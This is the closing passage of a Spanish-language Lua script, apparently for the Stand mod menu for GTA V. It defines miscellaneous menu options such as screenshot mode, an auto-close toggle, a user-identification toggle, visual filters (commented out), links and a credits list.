--------------------------------------------------------------------------------------------------------------------------------
-- Misc
--local visual_stuff = {
--    {"Better Illumination", "AmbientPush"},
--    {"Oversaturated", "rply_saturation"},
--    {"Boost Everything", "LostTimeFlash"},
--    {"Foggy Night", "casino_main_floor_heist"},
--    {"Better Night Time", "dlc_island_vault"},
--    {"Normal Fog", "Forest"},
--    {"Heavy Fog", "nervousRON_fog"},
--    {"Firewatch", "MP_Arena_theme_evening"},
--    {"Warm", "mp_bkr_int01_garage"},
--    {"Deepfried", "MP_deathfail_night"},
--    {"Stoned", "stoned"},
--    {"Underwater", "underwater"},
--}

--local visual_fidelity = menu.list(misc, "Visuales", {}, "")
--for id, data in pairs(visual_stuff) do
--    local effect_name = data[1]
--    local effect_thing = data[2]
--    menu.toggle(visual_fidelity, effect_name, {""}, "", function(toggled)
--        if toggled then
--            GRAPHICS.SET_TIMECYCLE_MODIFIER(effect_thing)
--            menu.trigger_commands("shader apagaos")
--        else
--            GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
--        end
--    end)
--end 

menu.hyperlink(misc, "Entra al discord!", "https://discord.gg/BNbSHhunPv")

menu.toggle(misc, "Cerrar Automaticamente", {}, "Cerrara el script automaticamente al entrar a gta. \nSi lo activas puede conllevar a menos tiempo de carga.", function(on)
    if on then
        if not SCRIPT_MANUAL_START then
            util.stop_script()
        end
    end
end)

menu.toggle(misc, "Modo Screenshot", {}, "Para que puedas tomar fotitos <3", function(on)
	if on then
		menu.trigger_commands("screenshot on")
	else
		menu.trigger_commands("screenshot off")
	end
end)

menu.toggle(misc, "Identificador de stand", {}, "Te hace invisible para otros usuarios de stand, pero tampoco los detectaras.", function(on_toggle)
    local standid = menu.ref_by_path("Online>Protections>Detections>Stand User Identification")
    if on_toggle then
        menu.trigger_command(standid, "on")
    else
        menu.trigger_command(standid, "off")
    end
end)

menu.hyperlink(misc, "Mi Github", "https://github.com/xxpichoclesxx")

local credits = menu.list(misc, "Creditos", {}, "")
local devcred = menu.list(credits, "Creditos Dev", {}, "")
local othercred = menu.list(credits, "Otros Creditos", {}, "")
menu.action(devcred, "Aaron", {}, "Thanks for helping me with my first steps in the stand lua api", function()
end)
menu.action(devcred, "gLance", {}, "He gave me a lot of help with Gta V natives.", function()
end)
menu.action(devcred, "LanceScriptTEOF", {}, "He helped me learn and understand Gta V natives", function()
end)
menu.action(devcred, "Cxbr", {}, "Thx for friendly features <3", function()
end)
menu.action(devcred, "Sapphire", {}, "Who helped me with almost every single feature and being patient because of my dumb brain <3", function()
end)
menu.action(devcred, "JinxScript/Prisuhm", {}, "Thx to him for shitting talking about me and saying 'Skidding is not the way you learn' \nCredits to jinxscript community for making jinxscript possible and also some of this functions.", function()
end)
menu.action(othercred, "Emir, Joju, Pepe, Ady, Vicente, Sammy", {}, "This will never be posible without them <3", function()
end)
menu.action(othercred, "Wigger", {}, "He bringed some ideas to the script and some functions, thx", function()
end)
menu.action(othercred, "HADES", {}, "He fully translated the script to korean", function()
end)
menu.action(othercred, "You <3", {}, "The people who are still here, thx to everyone <3", function()
end)

util.on_stop(function ()
    VEHICLE.SET_VEHICLE_GRAVITY(veh, true)
    ENTITY.SET_ENTITY_COLLISION(veh, true, true);
    util.toast("Adious\nEspero te haya gustado :3")
    util.toast("Limpiando...")
end)

players.dispatch_on_join()